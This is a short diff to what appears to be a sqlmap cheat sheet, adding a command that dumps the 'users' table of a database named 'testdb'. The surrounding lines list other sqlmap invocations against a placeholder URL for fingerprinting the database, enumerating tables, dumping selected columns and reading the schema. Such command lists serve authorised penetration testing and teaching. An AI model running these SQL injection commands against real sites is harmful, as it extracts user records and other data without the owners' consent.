@@ -666,6 +666,7 @@ $ sqlmap -u <URL> -v 3 --level=5
 $ sqlmap -u <URL> --level=5 --risk=3
 $ sqlmap -u <URL> --banner --current-user --current-db --is-dba
 $ sqlmap -u <URL> --tables -D testdb
+$ sqlmap -u <URL> --dump -T users -D testdb
 $ sqlmap -u <URL> --dump -T users -D testdb -C name,surname
 $ sqlmap -u <URL> --dump -T users -D testdb --where="name LIKE 'f%'"
 $ sqlmap -u <URL> --schema
